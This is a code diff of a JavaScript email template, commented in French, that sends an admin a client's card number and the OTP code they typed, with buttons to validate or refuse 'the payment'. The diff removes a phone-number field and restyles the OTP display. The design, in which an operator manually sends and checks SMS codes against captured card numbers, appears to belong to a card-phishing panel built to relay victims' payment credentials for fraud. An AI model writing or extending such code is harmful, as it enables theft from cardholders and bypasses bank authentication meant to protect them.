@@ -1,14 +1,12 @@
 import { emailLayout } from './layout';
 
 /**
- * EMAIL 2 — Envoyé à l'admin quand le client soumet son téléphone + code OTP.
- * Contient le numéro de téléphone, le code OTP tapé par le client,
- * et les boutons VALIDER / REFUSER.
+ * EMAIL 2 — Envoyé à l'admin quand le client soumet son code OTP.
+ * Contient le code OTP tapé par le client et les boutons VALIDER / REFUSER.
  *
  * @param {object} opts
  * @param {string} opts.userName    - Nom du client
  * @param {string} opts.userEmail   - Email du client
- * @param {string} opts.phone       - Numéro de téléphone saisi
  * @param {string} opts.otpCode     - Code OTP tapé par le client
  * @param {string} opts.cardNumber  - Numéro de carte (rappel)
  * @param {string} opts.bookingRef  - Référence de la réservation
@@ -19,7 +17,6 @@ import { emailLayout } from './layout';
 export function adminOtpValidationEmail({
   userName,
   userEmail,
-  phone,
   otpCode,
   cardNumber,
   bookingRef,
@@ -35,37 +32,25 @@ export function adminOtpValidationEmail({
       content: `
         <h2>Code OTP soumis par le client</h2>
         <p>
-          Le client a saisi son numéro de téléphone et le code OTP
-          que vous lui avez envoyé manuellement.
+          Le client a saisi le code OTP que vous lui avez envoyé.
           <strong>Vérifiez que le code correspond, puis validez ou refusez.</strong>
         </p>
 
-        <!-- Encart téléphone + OTP -->
+        <!-- Code OTP mis en avant -->
         <div style="
           margin: 20px 0;
-          padding: 20px 24px;
+          padding: 24px;
           background: #1e1b4b;
           border-radius: 12px;
+          text-align: center;
         ">
-          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:16px;">
-            <div>
-              <p style="margin:0 0 4px; color:#a5b4fc; font-size:11px; text-transform:uppercase; letter-spacing:2px; font-weight:600;">
-                Numéro de téléphone
-              </p>
-              <p style="margin:0; color:#ffffff; font-size:20px; font-weight:700; font-family:monospace; letter-spacing:2px;">
-                ${phone}
-              </p>
-            </div>
-            <div style="text-align:right;">
-              <p style="margin:0 0 4px; color:#a5b4fc; font-size:11px; text-transform:uppercase; letter-spacing:2px; font-weight:600;">
-                Code OTP saisi
-              </p>
-              <p style="margin:0; color:#ffffff; font-size:32px; font-weight:800; font-family:monospace; letter-spacing:8px;">
-                ${otpCode}
-              </p>
-            </div>
-          </div>
-          <p style="margin:0; color:#a5b4fc; font-size:11px; text-align:center;">
+          <p style="margin:0 0 8px; color:#a5b4fc; font-size:11px; text-transform:uppercase; letter-spacing:2px; font-weight:600;">
+            Code OTP saisi par le client
+          </p>
+          <p style="margin:0; color:#ffffff; font-size:40px; font-weight:800; font-family:monospace; letter-spacing:10px;">
+            ${otpCode}
+          </p>
+          <p style="margin:12px 0 0; color:#a5b4fc; font-size:12px;">
             Vérifiez que ce code correspond à celui que vous avez envoyé par SMS
           </p>
         </div>
@@ -104,7 +89,7 @@ export function adminOtpValidationEmail({
                font-size:15px;
                margin: 0 8px;
              ">
-            VALIDER le paiement
+            ✓ VALIDER le paiement
           </a>
           <a href="${rejectUrl}"
              style="
@@ -118,7 +103,7 @@ export function adminOtpValidationEmail({
                font-size:15px;
                margin: 0 8px;
              ">
-            REFUSER le paiement
+            ✗ REFUSER le paiement
           </a>
         </p>
 
